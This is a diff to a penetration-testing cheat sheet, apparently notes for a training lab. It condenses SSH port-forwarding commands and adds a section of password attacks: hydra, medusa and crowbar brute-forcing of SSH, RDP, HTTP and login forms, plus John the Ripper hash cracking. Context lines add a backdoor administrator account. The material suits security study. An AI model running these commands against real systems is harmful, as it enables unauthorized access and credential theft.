@@ -175,18 +175,11 @@ dirb http://www.megacorpone.com
 
 ## SSH Port Forwarding
 
-__Local Forwarding__ - Binding to local machine port 8080 and forwarding to 10.10.10.203 on port 80 via vps (only localhost can connect)
-
-`ssh -L 8080:10.10.10.203:80 vps_ip`
-
-__Remote forwarding__ - Remote ssh server listens on remote port 8080 and forwards all the traffic destined to remote port 8080 via ssh to destination host.(Opposite of Local Forwarding)
-
-`ssh -R 8080:localhost:80 public.example.com`
-
-__Dynamic Forwarding__ - Dynamic port forwarding allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. Running below command on vps will make it act as a socks proxy on port 8080.
-
-`ssh -D 96.126.72.56:8080 96.126.72.56`
-
+```
+ssh -N -L 8080:10.11.8.128:80 10.11.8.127
+ssh -N -R 10.11.8.128:8080:localhost:80 10.11.8.128
+ssh -N -D 127.0.0.1:8080 student@10.11.8.128
+```
 
 ## SVN commands
 
@@ -438,4 +431,29 @@ Start-Process cmd.exe -verb runAs
 ```
 net user evil Ev!lpass /add
 net localgroup administrators evil /add
+```
+
+## Password Attacks
+
+```
+cewl www.megacorpone.com -m 6 -w megacorp-cewt.txt
+
+// htaccess Attack with Medusa
+medusa -h 10.11.8.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
+
+// RDP brute force
+crowbar -b rdp -s 10.11.8.22/32 -u admin -C ~/password-file.txt -n 1
+
+// ssh attack with hydra
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+
+// http-post login brute force
+hydra 10.11.8.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+
+// cracking hash - hash.txt format should be user:pass
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+
+// Crack linux password hash
+unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+john --rules --wordlist=/usr/share/wordtists/rockyou.txt unshadowed.txt
 ```
